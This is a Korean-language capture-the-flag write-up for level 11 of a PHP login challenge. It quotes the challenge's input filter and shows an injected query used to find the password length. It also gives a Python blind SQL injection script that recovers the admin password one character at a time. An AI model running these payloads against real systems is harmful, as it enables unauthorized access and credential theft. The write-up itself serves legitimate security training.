<img width="155" alt="스크린샷 2020-01-11 오후 4 39 27" src="https://user-images.githubusercontent.com/54495632/72201054-766e5300-3493-11ea-8c6f-36c488738afe.png">

LV 11.

<img width="762" alt="스크린샷 2020-01-11 오후 4 55 49" src="https://user-images.githubusercontent.com/54495632/72201057-7a9a7080-3493-11ea-92d3-582d5df36e79.png">

  $id = $_GET['id'];
  $pw = $_GET['pw'];
  if(preg_match('/play|_|\.|\(|\)|info/i', $id)){ exit("Nope !!");}
  if(preg_match('/play|_|\.|\(|\)|info/i', $pw)){ exit("Nope !!");}
특별한 필터링 조건은 없다. id pw 를 get으로 받는 형식

if(($result['id']=='admin') && $result['pw']==$_GET['pw']){
    echo "C0n9raz!! Letz go 2 th3 n3xt L3v3l ^^";
    get_score();
  }else if($result){
    echo "Good J0b :)";
  }else{
    echo "N0p3..";
  }

전체 result 가 true이면 Good job:) 출력
false면 N0p3이 출력되고 id가 admin, pw가 맞으면 그 때 문제가 해결된다.

<img width="765" alt="스크린샷 2020-01-11 오후 5 02 03" src="https://user-images.githubusercontent.com/54495632/72201119-2ba10b00-3494-11ea-8ebf-a577e62dcdd3.png">

먼저 pw의 길이를 유추하기로 했다. 
select * from play_sql11 where id='admin' and pw=''or length(pw)<10#'

다음과 같은 쿼리문을 응용하여 여러 단계의 과정을 통해 

<img width="777" alt="스크린샷 2020-01-11 오후 5 03 29" src="https://user-images.githubusercontent.com/54495632/72201138-5ab77c80-3494-11ea-8371-7b8ca118b0db.png">

pw의 length가 7임을 찾았다.


<img width="274" alt="스크린샷 2020-01-11 오후 5 11 24" src="https://user-images.githubusercontent.com/54495632/72201274-88e98c00-3495-11ea-8c8d-31df8ed411ee.png">

import requests

cookies={'PHPSESSID':'55u9gmc98r1hrdgmohnr0upf75'}
url="http://crackus.jeju.kr/chall11.php?id="

id='admin'
flag=""
for i in range(1,8):
    for j in range(33,128):
        query=id+"&pw=%27or+ascii%28substr%28pw%2C"+str(i)+"%2C1%29%29%3D"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Good J0b :)")>0):
            flag+=chr(j)
            print (flag)
            break

print ("finish flag :"+flag)


파이썬을 이용하여 pw를 찾았다.

<img width="502" alt="스크린샷 2020-01-11 오후 5 11 11" src="https://user-images.githubusercontent.com/54495632/72201283-96067b00-3495-11ea-85a6-854669adccb2.png">

<img width="671" alt="스크린샷 2020-01-11 오후 5 11 17" src="https://user-images.githubusercontent.com/54495632/72201284-97d03e80-3495-11ea-8ffd-af8d707087de.png">